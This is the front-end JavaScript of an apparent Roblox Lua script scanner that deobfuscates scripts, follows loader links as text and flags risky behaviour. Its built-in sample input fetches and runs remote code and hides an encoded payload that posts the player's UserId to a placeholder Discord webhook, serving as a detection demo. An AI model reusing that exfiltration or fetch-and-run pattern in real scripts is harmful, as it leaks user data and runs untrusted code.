(function () {
  'use strict';
  var L = window.LuaScriptFucker, $ = function (id) { return document.getElementById(id); };
  var REPO = 'https://github.com/sxmoq/luascriptchecker';
  // Paste your Discord invite between the quotes when it is ready, for example 'https://discord.gg/yourcode'.
  var DISCORD_URL = '';
  // Optional: address of your own download helper (see proxy-worker.js). Many script sites block direct downloads from a web page.
  var PROXY_URL = '';

  var VIEWS = {
    dump: ['Dumper', 'Paste a script or a link. We read it, follow what it downloads, and tell you if it looks safe.'],
    clean: ['Deobfuscator', 'Turn an unreadable script into something you can read.'],
    byte: ['Bytecode', 'Read the text hidden inside compiled Luau or Lua files.'],
    api: ['API', 'Use the same tools from your own JavaScript.'],
    hist: ['History', 'Scripts you recently dumped or checked.'],
    give: ['Contribute', 'Help make the scanner smarter.']
  };
  var NEEDS = { dump: 1 };
  function enc(s) { return s.replace(/[\s\S]/g, function (c) { return '\\' + c.charCodeAt(0); }); }
  var SAMPLE = 'local Players = game:GetService("Players")\n' +
    'loadstring(game:HttpGet("https://scriptblox.com/raw/Example-Hub_abc123"))()\n' +
    'loadstring("' + enc('local hook="https://discord.com/api/webhooks/123/abc" game:GetService("HttpService"):PostAsync(hook, tostring(game.Players.LocalPlayer.UserId))') + '")()\n';

  var src = '', fname = '', cur = null, tab = 'sum', layerIx = 0, catSel = 'all';

  /* ---------- helpers ---------- */
  function esc(s) { return String(s).replace(/[&<>"]/g, function (c) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]; }); }
  function store(k, v) { try { if (v === undefined) return JSON.parse(localStorage.getItem(k)); localStorage.setItem(k, JSON.stringify(v)); } catch (e) { return null; } }
  function msg(t) { $('msg').textContent = t || ''; }
  function need() { if (!src.trim()) { msg('Add a script first: paste code above or drop a file on the box.'); return false; } msg(''); return true; }
  function dl(name, text) {
    var a = document.createElement('a'); a.href = URL.createObjectURL(new Blob([text], { type: 'text/plain' }));
    a.download = name; document.body.appendChild(a); a.click(); a.remove();
  }
  function copy(text, btn) {
    var done = function () { if (btn) { var o = btn.textContent; btn.textContent = 'Copied'; setTimeout(function () { btn.textContent = o; }, 1200); } };
    if (navigator.clipboard) navigator.clipboard.writeText(text).then(done, function () {});
    else { var t = document.createElement('textarea'); t.value = text; document.body.appendChild(t); t.select(); document.execCommand('copy'); t.remove(); done(); }
  }
  function short(s, n) { return s.length > n ? s.slice(0, n) + '…' : s; }
  function plural(n, w) { return n + ' ' + w + (n === 1 ? '' : 's'); }
  function addHist(kind, summary, text, name) {
    var h = store('lsf_hist') || [];
    h.unshift({ t: Date.now(), kind: kind, name: name || fname || 'Pasted script', summary: summary, src: (text !== undefined ? text : src).slice(0, 30000) });
    h = h.slice(0, 20);
    if (store('lsf_hist', h) === null && !store('lsf_hist')) store('lsf_hist', h.slice(0, 5));
  }

  function setSrc(text, name) {
    src = text; fname = name || ''; $('inp').value = text;
    $('fname').textContent = name || 'Script';
    $('count').textContent = text ? plural(text.split('\n').length, 'line') + ', ' + (text.length / 1024).toFixed(1) + ' KB' : '';
  }

  /* ---------- navigation ---------- */
  function show(v) {
    document.querySelectorAll('.side button').forEach(function (b) { b.classList.toggle('on', b.dataset.v === v); });
    document.querySelectorAll('.view').forEach(function (s) { s.hidden = s.id !== 'v-' + v; });
    $('inputCard').hidden = !NEEDS[v];
    $('title').textContent = VIEWS[v][0]; $('sub').textContent = VIEWS[v][1];
    msg('');
    if (v === 'hist') hist();
  }

  /* ---------- shared report pieces ---------- */
  function bandHtml(d, extra) {
    var vd = d.verdict, cls = { bad: 'bad', warn: 'warn', ok: 'ok', unknown: 'unk' }[vd.state];
    var num = vd.state === 'unknown' ? '<b>?</b><span>not enough to judge</span>' : '<b>' + d.score + '</b><span>risk out of 100</span>';
    return { title: vd.title, html: '<div class="verdict ' + cls + '"><div><h2>' + esc(vd.title) + '</h2><p>' + esc(vd.advice) + '</p></div>' +
      '<div class="vnum">' + num + '</div>' + (extra || '') + '</div>' };
  }
  function findingsHtml(list, withLayer) {
    if (!list.length) return '<p class="empty">Nothing risky matched.</p>';
    return list.map(function (f) {
      var where = 'line ' + f.line + (withLayer && f.layer > 0 ? ' · in: ' + f.via : '');
      return '<div class="item"><span class="dot l' + f.level + '"></span><div><div class="ih"><b>' + esc(f.title) + '</b><span class="muted">' +
        (f.count > 1 ? f.count + ' times · ' : '') + where + '</span></div><p>' + esc(f.why) + '</p>' +
        (f.snippet ? '<code class="snip">' + esc(f.snippet) + '</code>' : '') + '</div></div>';
    }).join('');
  }

  /* ---------- dumper ---------- */
  var ROLE = { run: 'Downloads and runs', send: 'Sends data to', fetch: 'Downloads', mention: 'Mentioned' };
  var CLS_CHIP = { hub: 'hub', exfil: 'bad', tracker: 'bad', paste: 'warn', tunnel: 'warn', short: 'warn', roblox: 'ok' };

  var remote = {}, tried = {}, runId = 0, histFor = -1;
  function autoOn() { return $('autoDl').checked; }

  function dump() {
    if (!need()) return;
    remote = {}; tried = {}; runId++; tab = 'sum'; layerIx = 0; catSel = 'all';
    if (!analyze()) return;
    $('dumpOut').scrollIntoView({ behavior: 'smooth', block: 'start' });
    follow(runId);
  }
  function analyze() {
    try { cur = L.dump(src, { remote: remote }); } catch (e) { msg('Could not read this script (' + e.message + ').'); return false; }
    if (layerIx >= cur.layers.length) layerIx = 0;
    render(); return true;
  }
  // Downloads text only. The text is never run, only read.
  function fetchText(u) {
    function get(url) {
      return fetch(url, { redirect: 'follow', credentials: 'omit' }).then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.status); return r.text(); });
    }
    return get(u).catch(function (e) {
      if (!PROXY_URL) throw e;
      return get(PROXY_URL + (PROXY_URL.indexOf('?') < 0 ? '?url=' : '&url=') + encodeURIComponent(u));
    }).then(function (t) {
      if (t.length > 3000000) throw new Error('too big');
      if (/^\s*<(?:!doctype|html)/i.test(t)) throw new Error('web page');
      return t;
    });
  }
  function fetchOne(p, id) {
    tried[p.fetchUrl] = 'loading'; render();
    return fetchText(p.fetchUrl).then(function (t) { if (id === runId) { remote[p.fetchUrl] = t; tried[p.fetchUrl] = 'done'; } },
      function () { if (id === runId) tried[p.fetchUrl] = 'failed'; }).then(function () { if (id === runId) analyze(); });
  }
  function follow(id) {
    if (id !== runId || !cur) return;
    var next = autoOn() ? cur.pending.filter(function (p) { return p.auto && !p.blocked && !tried[p.fetchUrl]; })[0] : null;
    if (next) { fetchOne(next, id).then(function () { follow(id); }); return; }
    if (histFor === id) { var h = store('lsf_hist') || []; h.shift(); store('lsf_hist', h); }
    histFor = id;
    addHist('Dump', cur.verdict.title + (cur.findings.length ? ', ' + plural(cur.findings.length, 'finding') : '') + (cur.meta.layers ? ', ' + plural(cur.meta.layers, 'extra layer') : ''));
  }

  function doesHtml(d) {
    return '<h3>What this script does</h3><ul class="does">' + d.says.map(function (s) { return '<li>' + esc(s) + '</li>'; }).join('') + '</ul>';
  }
  function pendingHtml(d) {
    if (!d.pending.length) return '';
    return '<h3>Scripts we still need to read</h3>' + d.pending.map(function (p, i) {
      var st = tried[p.fetchUrl], line;
      if (p.blocked) line = '<p>We don’t download links like this for you, because they are often tracking or shady links. Open it only if you trust it, then paste what you see.</p>';
      else if (st === 'loading') line = '<p class="muted">Downloading…</p>';
      else {
        line = (st === 'failed' ? '<p>We couldn’t download this one automatically. Many sites block that. Paste it yourself below, it takes about 20 seconds.</p>' : '') +
          '<div class="row" style="margin-top:8px">' + (st === 'failed' ? '' : '<button class="btn sm solid" data-dl="' + i + '" type="button">Download and check it</button>') +
          '<a class="btn sm" href="' + esc(p.fetchUrl) + '" target="_blank" rel="noopener noreferrer">Open link</a></div>';
      }
      return '<div class="pend"><div class="ih"><b>' + esc(p.name) + '</b><span class="muted">' + (p.layer ? 'found in a script it downloads' : 'found in your script') + '</span></div>' +
        '<code>' + esc(p.fetchUrl) + '</code>' + line +
        '<details' + (st === 'failed' || p.blocked ? ' open' : '') + '><summary>Paste it yourself</summary><ol class="steps"><li>Open the link in a new tab.</li><li>Select everything on that page and copy it.</li><li>Paste it here.</li></ol>' +
        '<textarea class="paste" spellcheck="false" aria-label="Script text"></textarea><div class="row"><button class="btn sm solid" data-add="' + i + '" type="button">Check it</button></div></details></div>';
    }).join('');
  }

  function render() {
    var d = cur, o = d.obfuscation, links = d.loaders.length, n = d.meta.layers;
    var facts = '<div class="facts"><span><b>' + esc(o.label) + '</b>' + (o.families.length ? ' (' + esc(o.families.join(', ')) + ')' : '') + '</span>' +
      '<span><b>' + n + '</b> extra ' + (n === 1 ? 'layer' : 'layers') + ' read</span>' +
      '<span><b>' + links + '</b> ' + (links === 1 ? 'link' : 'links') + '</span>' +
      '<span><b>' + d.meta.lines + '</b> ' + (d.meta.lines === 1 ? 'line' : 'lines') + ', ' + (d.meta.bytes / 1024).toFixed(1) + ' KB</span></div>';
    var tabs = [['sum', 'Details', d.findings.length], ['links', 'Links', links], ['layers', 'Layers', d.layers.length], ['strs', 'Strings', d.strings.length], ['calls', 'Calls', d.calls.length]];
    $('dumpOut').innerHTML = bandHtml(d, facts).html + doesHtml(d) + pendingHtml(d) +
      '<div class="tabs" role="tablist">' + tabs.map(function (t) {
        return '<button class="tab' + (t[0] === tab ? ' on' : '') + '" role="tab" data-tab="' + t[0] + '">' + t[1] + '<i>' + t[2] + '</i></button>';
      }).join('') + '</div><div class="panel" id="tabBody"></div>' +
      '<div class="row"><button class="btn sm" data-act="summary" type="button">Copy summary</button><button class="btn sm" data-act="report" type="button">Save report (.txt)</button><button class="btn sm" data-act="json" type="button">Save as JSON</button></div>';
    body();
  }

  function body() {
    var d = cur, h = '';
    if (tab === 'sum') {
      var o = d.obfuscation;
      h += (d.meta.layers ? '<div class="hint">Extra code was unpacked or downloaded and checked too. Open the <b>Layers</b> tab to read it.</div>' : '') + findingsHtml(d.findings, true);
      h += '<h3>Obfuscation</h3><div><b>' + esc(o.label) + '</b> <span class="muted">(score ' + o.score + ' out of 100' + (o.families.length ? ', looks like ' + esc(o.families.join(', ')) : '') + ')</span>' +
        (o.signals.length ? '<ul class="sig">' + o.signals.map(function (s) { return '<li>' + esc(s) + '</li>'; }).join('') + '</ul>' : '<p class="muted" style="margin:4px 0 0">Nothing here looks scrambled.</p>') + '</div>';
      if (d.iocs.ips.length) h += '<h3>IP addresses</h3><ul class="list">' + d.iocs.ips.map(function (ip) { return '<li><code>' + esc(ip) + '</code></li>'; }).join('') + '</ul>';
      if (d.iocs.assets.length) h += '<h3>Roblox asset IDs</h3><ul class="list">' + d.iocs.assets.map(function (a) { return '<li><code>' + esc(a.id) + '</code><span class="chip">' + esc(a.kind) + '</span></li>'; }).join('') + '</ul>';
    } else if (tab === 'links') {
      h += '<div class="hint">Links are never opened here. To see what a loader really runs, open it yourself somewhere safe and paste the code into this page.</div>';
      h += d.loaders.length ? d.loaders.map(function (l, i) {
        return '<div class="lk"><span class="role ' + l.role + '">' + ROLE[l.role] + '</span><div><div class="meta"><span class="chip ' + (CLS_CHIP[l.cls] || '') + '">' + esc(l.name) + '</span>' +
          (l.layer ? '<span class="chip">layer ' + l.layer + '</span>' : '') + (l.count > 1 ? '<span class="chip">' + l.count + ' times</span>' : '') + '</div><code>' + esc(l.url) + '</code></div>' +
          '<button class="btn sm" data-copy="' + i + '" type="button">Copy</button></div>';
      }).join('') : '<p class="empty">No links found.</p>';
    } else if (tab === 'layers') {
      h += '<div class="layers">' + d.layers.map(function (ly, i) {
        return '<button class="btn sm' + (i === layerIx ? ' on' : '') + '" data-layer="' + i + '" type="button">' + (i === 0 ? 'Original (cleaned)' : 'Layer ' + i) + '</button>';
      }).join('') + '</div>';
      var ly = d.layers[layerIx];
      h += '<div class="codewrap"><div class="etop"><span class="fname">' + esc(ly.via) + '</span><span class="muted">' + plural(ly.lines, 'line') + ', ' + (ly.size / 1024).toFixed(1) + ' KB</span><span class="grow"></span>' +
        '<button class="btn sm" data-act="copy-layer" type="button">Copy</button><button class="btn sm" data-act="save-layer" type="button">Save .lua</button></div>' +
        '<textarea class="codebox" id="layerBox" readonly spellcheck="false" aria-label="Decoded code"></textarea></div>' +
        (layerIx === 0 ? '<p class="muted">Escapes, split strings and hex numbers are decoded so the text is readable. Layers below are code that was stored inside strings.</p>' : '');
    } else if (tab === 'strs') {
      h += '<div class="toolbar"><input class="srch" id="strQ" type="search" placeholder="Search text" aria-label="Search text"><label class="chk"><input type="checkbox" id="strHid"> Only text revealed by decoding</label></div><ul class="list" id="strList"></ul>';
    } else {
      var cats = {}; d.calls.forEach(function (c) { cats[c.cat] = (cats[c.cat] || 0) + 1; });
      h += '<div class="toolbar cats"><button class="btn sm' + (catSel === 'all' ? ' on' : '') + '" data-cat="all" type="button">All ' + d.calls.length + '</button>' +
        Object.keys(d.catLabels).filter(function (k) { return cats[k]; }).map(function (k) {
          return '<button class="btn sm' + (catSel === k ? ' on' : '') + '" data-cat="' + k + '" type="button">' + d.catLabels[k] + ' ' + cats[k] + '</button>';
        }).join('') + '</div><ul class="list" id="callList"></ul>';
    }
    $('tabBody').innerHTML = h;
    if (tab === 'layers') $('layerBox').value = d.layers[layerIx].code;
    if (tab === 'strs') strs();
    if (tab === 'calls') callsList();
  }
  function strs() {
    var q = ($('strQ').value || '').toLowerCase(), only = $('strHid').checked;
    var list = cur.strings.filter(function (s) { return (!only || s.hidden) && (!q || s.text.toLowerCase().indexOf(q) >= 0); });
    $('strList').innerHTML = list.length ? list.slice(0, 300).map(function (s) {
      return '<li><code>' + esc(short(s.text, 180)) + '</code>' + (s.hidden ? '<span class="chip hub">decoded</span>' : '') + (s.count > 1 ? '<span class="muted">×' + s.count + '</span>' : '') + '</li>';
    }).join('') + (list.length > 300 ? '<li class="muted">Showing the first 300 of ' + list.length + '. Use the search to narrow it down.</li>' : '') : '<li class="muted">No text matches.</li>';
  }
  function callsList() {
    var list = cur.calls.filter(function (c) { return catSel === 'all' || c.cat === catSel; });
    $('callList').innerHTML = list.length ? list.slice(0, 250).map(function (c) {
      return '<li><code>' + esc(c.text) + '</code><span class="chip">' + cur.catLabels[c.cat] + '</span><span class="muted">×' + c.count + '</span></li>';
    }).join('') : '<li class="muted">No function calls found.</li>';
  }

  function reportText() {
    var d = cur;
    var out = ['LuaScriptFucker report', 'File: ' + (fname || 'pasted script'), 'Verdict: ' + d.verdict.title, d.verdict.advice, '', 'What this script does:']
      .concat(d.says.map(function (s) { return '- ' + s; }));
    out.push('', 'Findings:');
    out = out.concat(d.findings.length ? d.findings.map(function (f) { return '- ' + f.title + ' (line ' + f.line + ', ' + f.via + '): ' + f.why; }) : ['- none']);
    out.push('', 'Links:');
    out = out.concat(d.loaders.length ? d.loaders.map(function (l) { return '- [' + ROLE[l.role] + '] ' + l.name + ': ' + l.url + (l.resolved ? ' (read)' : ''); }) : ['- none']);
    return out.join('\n');
  }

  $('dumpOut').addEventListener('click', function (e) {
    var b = e.target.closest('button'); if (!b || !cur) return;
    if (b.dataset.tab) { tab = b.dataset.tab; render(); }
    else if (b.dataset.layer) { layerIx = +b.dataset.layer; body(); }
    else if (b.dataset.cat) { catSel = b.dataset.cat; body(); }
    else if (b.dataset.copy) copy(cur.loaders[+b.dataset.copy].url, b);
    else if (b.dataset.dl) { var p = cur.pending[+b.dataset.dl]; if (p) fetchOne(p, runId).then(function () { follow(runId); }); }
    else if (b.dataset.add) {
      var p2 = cur.pending[+b.dataset.add], ta = b.closest('.pend').querySelector('textarea');
      if (!p2) return;
      if (!ta.value.trim()) { msg('Paste the script text into the box first.'); return; }
      msg(''); remote[p2.fetchUrl] = ta.value; tried[p2.fetchUrl] = 'done'; analyze(); follow(runId);
    }
    else if (b.dataset.act === 'summary') copy(reportText(), b);
    else if (b.dataset.act === 'copy-layer') copy(cur.layers[layerIx].code, b);
    else if (b.dataset.act === 'save-layer') dl(layerIx === 0 ? 'cleaned.lua' : 'layer' + layerIx + '.lua', cur.layers[layerIx].code);
    else if (b.dataset.act === 'report') dl('report.txt', reportText());
    else if (b.dataset.act === 'json') dl('report.json', JSON.stringify(cur, null, 2));
  });
  $('dumpOut').addEventListener('input', function (e) { if (e.target.id === 'strQ') strs(); });
  $('dumpOut').addEventListener('change', function (e) { if (e.target.id === 'strHid') strs(); });

  /* ---------- bytecode ---------- */
  function readBytes(f) {
    if (!f) return; var fr = new FileReader();
    fr.onload = function () {
      var res = L.bytecode(new Uint8Array(fr.result)), html = '', texts = res.strings.join('\n');
      html += '<dl class="kv"><dt>File</dt><dd>' + esc(f.name) + '</dd><dt>Type</dt><dd>' + esc(res.kind) + '</dd><dt>Size</dt><dd>' + (res.size / 1024).toFixed(1) + ' KB</dd>' +
        (res.version ? '<dt>Bytecode version</dt><dd>' + res.version + '</dd>' : '') +
        '<dt>How text was found</dt><dd>' + (res.parsed ? 'Read from the bytecode’s string table' : 'Scanned the file for readable text') + '</dd></dl>';
      var title = res.kind;
      if (res.strings.length) {
        var d = L.dump(texts), b = bandHtml(d); title = b.title;
        html += b.html + '<h3>What was found</h3>' + findingsHtml(d.findings, false) + '<h3>Text found (' + res.strings.length + ')</h3><ul class="list">' +
          res.strings.slice(0, 300).map(function (t) { return '<li><code>' + esc(short(t, 180)) + '</code></li>'; }).join('') + '</ul>';
      } else html += '<p class="empty">No readable text found in this file.</p>';
      $('byteOut').innerHTML = html;
      addHist('Bytecode', title, texts, f.name);
    };
    fr.readAsArrayBuffer(f);
  }

  /* ---------- history ---------- */
  function hist() {
    var h = store('lsf_hist') || [];
    $('histOut').innerHTML = h.length ? h.map(function (e, i) {
      return '<div class="hrow"><span class="tag">' + esc(e.kind) + '</span><div class="grow"><b>' + esc(e.name) + '</b><div class="muted">' + esc(e.summary) + ' · ' + new Date(e.t).toLocaleString() + '</div></div><button class="btn sm" data-i="' + i + '" type="button">Open</button></div>';
    }).join('') : '<p class="empty">Nothing here yet. Dump a script and it shows up here.</p>';
  }

  /* ---------- wiring ---------- */
  document.querySelectorAll('.side button').forEach(function (b) { b.addEventListener('click', function () { show(b.dataset.v); }); });
  document.querySelectorAll('[data-goto]').forEach(function (b) { b.addEventListener('click', function () { show(b.dataset.goto); }); });

  $('inp').addEventListener('input', function () { setSrc($('inp').value, ''); });
  $('bOpen').addEventListener('click', function () { $('file').click(); });
  $('bSample').addEventListener('click', function () { setSrc(SAMPLE, 'example.lua'); msg(''); });
  $('bClear').addEventListener('click', function () { setSrc('', ''); cur = null; $('dumpOut').innerHTML = ''; msg(''); $('inp').focus(); });

  function readText(f) { if (!f) return; var r = new FileReader(); r.onload = function () { setSrc(String(r.result), f.name); msg(''); }; r.readAsText(f); }
  $('file').addEventListener('change', function (e) { readText(e.target.files[0]); e.target.value = ''; });
  var ed = $('inputCard');
  ['dragenter', 'dragover'].forEach(function (ev) { ed.addEventListener(ev, function (e) { e.preventDefault(); ed.classList.add('drag'); }); });
  ['dragleave', 'drop'].forEach(function (ev) { ed.addEventListener(ev, function (e) { e.preventDefault(); ed.classList.remove('drag'); }); });
  ed.addEventListener('drop', function (e) { readText(e.dataTransfer.files[0]); });

  var bz = $('bDrop');
  bz.addEventListener('click', function () { $('bFile').click(); });
  bz.addEventListener('keydown', function (e) { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); $('bFile').click(); } });
  $('bFile').addEventListener('change', function (e) { readBytes(e.target.files[0]); e.target.value = ''; });
  ['dragenter', 'dragover'].forEach(function (ev) { bz.addEventListener(ev, function (e) { e.preventDefault(); bz.classList.add('drag'); }); });
  ['dragleave', 'drop'].forEach(function (ev) { bz.addEventListener(ev, function (e) { e.preventDefault(); bz.classList.remove('drag'); }); });
  bz.addEventListener('drop', function (e) { readBytes(e.dataTransfer.files[0]); });

  if (store('lsf_auto') === false) $('autoDl').checked = false;
  $('autoDl').addEventListener('change', function () { store('lsf_auto', $('autoDl').checked); });
  $('bDump').addEventListener('click', dump);
  $('inp').addEventListener('keydown', function (e) { if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') dump(); });

  $('histOut').addEventListener('click', function (e) {
    var b = e.target.closest('button[data-i]'); if (!b) return;
    var h = (store('lsf_hist') || [])[+b.dataset.i]; if (!h) return;
    if (h.kind === 'Bytecode') { show('byte'); return; }
    setSrc(h.src, h.name); show('dump'); dump();
  });
  $('bWipe').addEventListener('click', function () { store('lsf_hist', []); hist(); });

  if (DISCORD_URL) $('discordBtn').href = DISCORD_URL;
  $('discordBtn').addEventListener('click', function (e) { if (!DISCORD_URL) { e.preventDefault(); msg('The Discord invite link has not been added yet. Check back soon.'); } });

  $('gSend').addEventListener('click', function () {
    var t = $('gType').value, title = $('gTitle').value.trim(), body = $('gBody').value.trim();
    if (!title) { msg('Give your suggestion a short title first.'); return; }
    msg('');
    window.open(REPO + '/issues/new?title=' + encodeURIComponent('[' + t + '] ' + title) + '&body=' + encodeURIComponent('**Type:** ' + t + '\n\n' + (body || '(no details)') + '\n\n_Sent from the LuaScriptFucker website._'), '_blank', 'noopener');
  });

  show('dump');
})();
